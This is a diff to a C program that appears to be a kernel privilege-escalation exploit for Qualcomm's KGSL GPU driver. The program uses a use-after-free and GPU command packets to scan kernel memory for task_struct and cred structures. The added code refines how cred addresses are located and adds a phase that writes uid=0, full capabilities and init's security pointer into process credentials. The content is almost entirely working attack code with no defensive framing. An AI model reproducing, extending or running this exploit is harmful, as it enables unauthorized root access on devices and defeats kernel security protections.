@@ -447,8 +447,13 @@ int main(int argc, char **argv) {
     uint32_t task_comm_offs[16];
     int n_task = 0;
     uint32_t task_page_data[SCAN_DWORDS];
-    uint64_t cred_addrs[32];
+    uint64_t cred_pages[32];
+    int cred_offs[32];
     int n_cred = 0;
+
+    // 追加: 正しいcredアドレスを保存する配列
+    uint64_t cred_real_addrs[32];
+    int n_cred_real = 0;
 
     uint64_t scan_start = UAF_ADDR + 0x300000;
     if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;
@@ -485,7 +490,13 @@ int main(int argc, char **argv) {
                 n_comm++;
             }
         }
-
+        int cred_off_found = -1;
+        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
+            int cnt = 0;
+            for (int j = 0; j < 8; j++)
+                if (data[i + j] == 0x000007D0) cnt++;
+            if (cnt >= 4) { cred_off_found = i * 4; break; }
+        }
         if (n_comm > 0) {
             printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
                 (unsigned long)va, nz, comm_off);
@@ -493,55 +504,82 @@ int main(int argc, char **argv) {
             task_pages[n_task++] = va;
             if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
 
+            // 追加: task_struct->cred を読み取る (オフセット CRED_OFF)
             uint64_t cred_ptr = 0;
             uint32_t cred_lo = data[CRED_OFF/4];
             uint32_t cred_hi = data[CRED_OFF/4 + 1];
             cred_ptr = (uint64_t)cred_lo | ((uint64_t)cred_hi << 32);
-            if (cred_ptr != 0 && n_cred < 32) {
-                printf("  [CRED_PTR] va=0x%lx cred=0x%lx\n", (unsigned long)va, (unsigned long)cred_ptr);
-                cred_addrs[n_cred] = cred_ptr;
-                n_cred++;
+            if (cred_ptr != 0 && n_cred_real < 32) {
+                printf("  [CRED_REAL] va=0x%lx cred=0x%lx\n", (unsigned long)va, (unsigned long)cred_ptr);
+                cred_real_addrs[n_cred_real++] = cred_ptr;
+            }
+        }
+        if (cred_off_found >= 0 && n_cred < 32) {
+            printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
+                (unsigned long)va, nz, cred_off_found);
+            cred_pages[n_cred] = va;
+            cred_offs[n_cred] = cred_off_found;
+            n_cred++;
+        }
+        int sec_hits[64]; int n_sec = 0;
+        for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
+            if (data[i] == data[i+1] && data[i] == data[i+2] &&
+                data[i] == data[i+3] && data[i] == data[i+4] &&
+                data[i] == data[i+5] && data[i] != 0) {
+                int dup = 0;
+                for (int s = 0; s < n_sec; s++)
+                    if (sec_hits[s] == (int)data[i]) { dup = 1; break; }
+                if (!dup) {
+                    sec_hits[n_sec++] = data[i];
+                    if (data[i] < 10000)
+                        printf("  [SEC_CRED] va=0x%lx sid=%u off=0x%x\n",
+                            (unsigned long)va, data[i], i*4);
+                }
+                i += 6;
             }
         }
     }
-    printf("[*] Scan complete: found %d task_struct pages, %d cred addresses\n", n_task, n_cred);
+    printf("[*] Scan complete: found %d task_struct pages, %d cred pages, %d real cred addresses\n",
+        n_task, n_cred, n_cred_real);
 
-    if (n_cred == 0) { printf("[-] No cred found\n"); return 1; }
-
+    // Storage for preserved cred fields (user, user_ns, group_info)
     uint32_t saved_user_lo = 0, saved_user_hi = 0;
     uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
     uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
 
-    printf("[*] Phase 7c: Dumping first cred structure for layout verification\n");
-    memset(ib_m, 0, 0x10000);
-    memset(dst_m, 0, 0x1000);
-    uint32_t *ccmd = (uint32_t *)ib_m;
-    int cdw = 0;
-    ccmd[cdw++] = cp_type7(CP_NOP, 0);
-    for (int ci = 0; ci < 48; ci++) {
-        uint32_t cdl, cdh, csl, csh;
-        split64(dst_ga + ci * 4, &cdl, &cdh);
-        split64(cred_addrs[0] + ci * 4, &csl, &csh);
-        ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-        ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
-        ccmd[cdw++] = csl; ccmd[cdw++] = csh;
-    }
-    ccmd[cdw++] = cp_type7(CP_NOP, 0);
-    __sync_synchronize();
-    unsigned int cts;
-    if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-        wait_timestamp(kgsl_fd, ctx_id, cts);
-        __sync_synchronize();
-        uint32_t *cd = (uint32_t *)dst_m;
-        printf("  cred+0x00:");
+    // Dump first cred page content via GPU to verify struct layout
+    if (n_cred > 0) {
+        printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        uint32_t *ccmd = (uint32_t *)ib_m;
+        int cdw = 0;
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
         for (int ci = 0; ci < 48; ci++) {
-            if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-            printf(" %08X", cd[ci]);
+            uint32_t cdl, cdh, csl, csh;
+            split64(dst_ga + ci * 4, &cdl, &cdh);
+            split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
+            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
+            ccmd[cdw++] = csl; ccmd[cdw++] = csh;
         }
-        printf("\n");
-        saved_user_lo = cd[32]; saved_user_hi = cd[33];
-        saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
-        saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int cts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
+            wait_timestamp(kgsl_fd, ctx_id, cts);
+            __sync_synchronize();
+            uint32_t *cd = (uint32_t *)dst_m;
+            printf("  cred+0x00:");
+            for (int ci = 0; ci < 48; ci++) {
+                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
+                printf(" %08X", cd[ci]);
+            }
+            printf("\n");
+            saved_user_lo = cd[32]; saved_user_hi = cd[33];
+            saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
+            saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
+        }
     }
 
     uint64_t inc_sec = 0;
@@ -612,11 +650,12 @@ int main(int argc, char **argv) {
         }
     }
 
+    // ===== 元の Phase 8b (既存のループ) =====
     if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid=0, full caps, and init context pointer to %d creds\n", n_cred);
+        printf("[*] Phase 8b (original): Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
         for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_addrs[p];
+            uint64_t cbase = cred_pages[p] + cred_offs[p];
             uint32_t *cmd = (uint32_t *)ib_m;
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
@@ -643,10 +682,6 @@ int main(int argc, char **argv) {
 
             n_ok++;
 
-            memset(ib_m, 0, 0x10000);
-            dw = 0;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-
             if (inc_sec != 0) {
                 printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
                     (unsigned long)inc_sec, p);
@@ -657,6 +692,8 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
+            memset(ib_m, 0, 0x10000);
+            dw = 0;
             split64(cbase + 0x04, &zl, &zh);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
             cmd[dw++] = zl; cmd[dw++] = zh;
@@ -667,7 +704,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0; cmd[dw++] = 0;
-
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x04, &sl, &sh);
@@ -683,7 +719,7 @@ int main(int argc, char **argv) {
             printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
                 uid == 0 ? "OK" : "FAIL");
         }
-        printf("  Phase 8b: %d creds updated\n", n_ok);
+        printf("  Phase 8b (original): %d creds updated\n", n_ok);
 
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
@@ -694,7 +730,7 @@ int main(int argc, char **argv) {
             for (int ci = 0; ci < 48; ci++) {
                 uint32_t dl, dh, sl, sh;
                 split64(dst_ga + ci * 4, &dl, &dh);
-                split64(cred_addrs[0] + ci * 4, &sl, &sh);
+                split64(cred_pages[0] + cred_offs[0] + ci * 4, &sl, &sh);
                 ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
                 ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
                 ccmd[cdw++] = sl; ccmd[cdw++] = sh;
@@ -714,6 +750,83 @@ int main(int argc, char **argv) {
                 printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
                     cd[31], cd[30], cd[1]);
             }
+        }
+    }
+
+    // ===== 追加: 正しいcredアドレスを使った書き込み (Context重写) =====
+    if (n_cred_real > 0 && inc_sec != 0) {
+        printf("[*] Phase 8b (NEW): Writing uid=0 and init security pointer to %d real creds\n", n_cred_real);
+        for (int p = 0; p < n_cred_real && p < 32; p++) {
+            uint64_t cbase = cred_real_addrs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            uint32_t zl, zh, dl, dh, sl, sh;
+            int dw;
+
+            // 書き込み前にダンプ (デバッグ)
+            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int ci = 0; ci < 48; ci++) {
+                split64(dst_ga + ci * 4, &dl, &dh);
+                split64(cbase + ci * 4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t *bd = (uint32_t *)dst_m;
+            printf("  REAL cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
+                p, bd[31], bd[30], bd[1]);
+
+            // 書き込みコマンド構築
+            memset(ib_m, 0, 0x10000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+
+            // 1) securityポインタをinitのものに書き換え (offset 0x78)
+            split64(cbase + 0x78, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            split64(inc_sec, &zl, &zh);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+
+            // 2) uid=0, euid=0, その他credフィールドを0、capsをフルに
+            split64(cbase + 0x04, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            for (int i = 0; i < 8; i++) cmd[dw++] = 0;  // uid, gid, suid, sgid, euid, egid, fsuid, fsgid
+            cmd[dw++] = 0x00000004;                     // securebits
+            cmd[dw++] = 0; cmd[dw++] = 0;               // padding?
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_inheritable
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_permitted
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_effective
+            cmd[dw++] = 0; cmd[dw++] = 0;               // cap_bset
+
+            // 3) キャッシュフラッシュ (GPU書き込みをメモリに反映)
+            cmd[dw++] = cp_type7(CP_EVENT_WRITE, 0);
+            cmd[dw++] = CACHE_FLUSH_TS;
+
+            // 4) 読み戻し (uid確認)
+            memset(dst_m, 0, 0x1000);
+            split64(dst_ga, &dl, &dh);
+            split64(cbase + 0x04, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+
+            __sync_synchronize();
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t uid = *(volatile uint32_t*)dst_m;
+            printf("  REAL CRED[%d]: uid=0x%08X %s\n", p, uid,
+                uid == 0 ? "OK" : "FAIL");
         }
     }
 
